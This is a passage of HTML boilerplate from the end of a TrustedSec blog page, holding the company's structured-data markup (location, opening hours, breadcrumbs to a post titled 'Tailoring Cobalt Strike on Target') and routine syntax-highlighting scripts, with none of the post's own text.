Boulevard"},"geo":{"@type":"GeoCoordinates","latitude":"41.112090","longitude":"-81.638900"},"name":"TrustedSec","openingHoursSpecification":[{"@type":"OpeningHoursSpecification","closes":"17:00:00","dayOfWeek":["Monday"],"opens":"09:00:00"},{"@type":"OpeningHoursSpecification","closes":"17:00:00","dayOfWeek":["Tuesday"],"opens":"09:00:00"},{"@type":"OpeningHoursSpecification","closes":"17:00:00","dayOfWeek":["Wednesday"],"opens":"09:00:00"},{"@type":"OpeningHoursSpecification","closes":"17:00:00","dayOfWeek":["Thursday"],"opens":"09:00:00"},{"@type":"OpeningHoursSpecification","closes":"17:00:00","dayOfWeek":["Friday"],"opens":"09:00:00"}],"priceRange":"$"},{"@id":"#creator","@type":"Organization"},{"@type":"BreadcrumbList","description":"Breadcrumbs list","itemListElement":[{"@type":"ListItem","item":"https://trustedsec.com/","name":"Home","position":1},{"@type":"ListItem","item":"https://trustedsec.com/blog","name":"Blog","position":2},{"@type":"ListItem","item":"https://trustedsec.com/blog/tailoring-cobalt-strike-on-target","name":"Tailoring Cobalt Strike on Target","position":3}],"name":"Breadcrumbs"}]}</script><script src="/dist/scripts.min.js?ver=dd6afd28096abab5e16c2df1325360883ca900bd"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script>document.addEventListener('DOMContentLoaded', (event) => {
              document.querySelectorAll('pre').forEach((block) => {
                hljs.highlightElement(block);
              });
            });</script></body>
</html>